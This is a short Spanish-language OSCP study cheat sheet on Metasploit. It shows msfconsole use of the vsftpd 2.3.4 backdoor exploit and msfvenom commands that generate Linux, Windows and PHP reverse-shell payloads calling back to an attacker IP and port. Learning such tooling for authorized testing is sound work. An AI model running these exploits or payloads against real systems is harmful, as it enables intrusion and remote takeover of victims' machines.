Metasploit es un framework completo de explotación, post-explotación y generación de payloads. Aunque su uso está limitado en OSCP (solo permitido en 1 máquina), `msfvenom` y `msfconsole` siguen siendo herramientas clave para la fase de explotación y payload crafting.

---

## 1. msfconsole — Uso Básico

Iniciar el framework:
```bash
msfconsole
```

Buscar exploits:
```bash
search vsftpd
search type:exploit platform:windows smb
```

Seleccionar un módulo:
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Ver opciones y configurar:
```bash
show options
set RHOSTS <IP>
set LHOST <tu_IP>
set LPORT 4444
set PAYLOAD linux/x86/shell_reverse_tcp
run
```

---

## 2. msfvenom — Generación de Payloads

### Sintaxis general:
```bash
msfvenom -p <payload> LHOST=<tu_IP> LPORT=<puerto> -f <formato> > output
```

### Ejemplos comunes:

#### Shell reversa en formato ELF:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.1 LPORT=4444 -f elf > shell.elf
```

#### Shell reversa para Windows (EXE):
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.1 LPORT=4444 -f exe > shell.exe
```

#### Payload para inyectar en PHP:
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.0.1 LPORT=4444 -f raw
```

---

## Formatos soportados
- `exe`, `elf`, `raw`, `asp`, `php`, `psh`, `bash`, `war`, `js`, `hta`, `c`, etc.

---

## Casos de Uso OSCP
- Generar payloads personalizados para subida tras vulnerabilidad
- Usar `msfconsole` para exploits conocidos (solo en 1 máquina)
- Adaptar shells a formatos específicos (web, powershell, binarios)

---

## Buenas Prácticas
- Usa `--platform`, `--arch` si necesitas precisión (ej. x64 vs x86)
- Redirige la salida a un archivo (`>`) solo si es binario o código
- Nunca uses Metasploit como primer recurso: en OSCP es penalizable

---
